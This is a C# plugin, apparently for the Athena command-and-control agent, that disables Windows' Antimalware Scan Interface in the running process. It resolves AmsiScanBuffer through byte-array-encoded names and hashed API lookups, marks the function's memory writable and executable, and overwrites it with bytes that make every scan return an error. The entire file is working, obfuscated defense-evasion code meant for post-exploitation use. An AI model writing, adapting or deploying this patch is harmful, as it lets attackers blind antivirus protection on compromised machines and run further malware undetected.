using Athena.Plugins;
using System.Runtime.InteropServices;
using System.Text;

namespace Plguins
{
    public class Plugin : AthenaPlugin
    {
        public override string Name => "amsi";
        byte[] sword = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        byte[] spear = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


        const double LLHash = 61706584741;
        const long GetProcAddrHash = 11604195004155;
        const long VirtPro = 65467780416196;


        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate IntPtr GPADelegate(IntPtr module, string procName);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        public delegate Boolean VPDelegate(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                if (Environment.Is64BitProcess)
                {
                    if (SpearAndShield(sword))
                    {
                        PluginHandler.Write("Success", (string)args["task-id"], true);
                        return;
                    }
                }
                else
                {
                    if (SpearAndShield(spear))
                    {
                        PluginHandler.Write("Success", (string)args["task-id"], true);
                        return;
                    }
                }

                PluginHandler.Write("Failed", (string)args["task-id"], true, "error");
                return;
            }
            catch (Exception e)
            {
                //oh no an error
                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
            }
        }
        private static bool SpearAndShield(byte[] shield)
        {
            try
            {
                byte[] bSword = new byte[] { 0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c };

                IntPtr pSword = LoadLibrary(Encoding.ASCII.GetString(bSword));

                if (pSword == IntPtr.Zero)
                {
                    return false;
                }


                byte[] bufSword = new byte[] { 0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72 };

                IntPtr ptrGPA = HInvoke.GetfuncaddressbyHash("kernel32.dll", GetProcAddrHash);
                IntPtr ptrVP = HInvoke.GetfuncaddressbyHash("kernel32.dll", VirtPro);

                GPADelegate gpa = (GPADelegate)Marshal.GetDelegateForFunctionPointer(ptrGPA, typeof(GPADelegate));
                IntPtr pShield = gpa(pSword, Encoding.ASCII.GetString(bufSword));

                if (pShield == IntPtr.Zero)
                {
                    return false;
                }

                uint uCape;
                VPDelegate ptrVPD = (VPDelegate)Marshal.GetDelegateForFunctionPointer(ptrVP, typeof(VPDelegate));
                if (!ptrVPD(pShield, (UIntPtr)shield.Length, 0x40, out uCape))
                {
                    return false;
                }

                Marshal.Copy(shield, 0, pShield, shield.Length);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
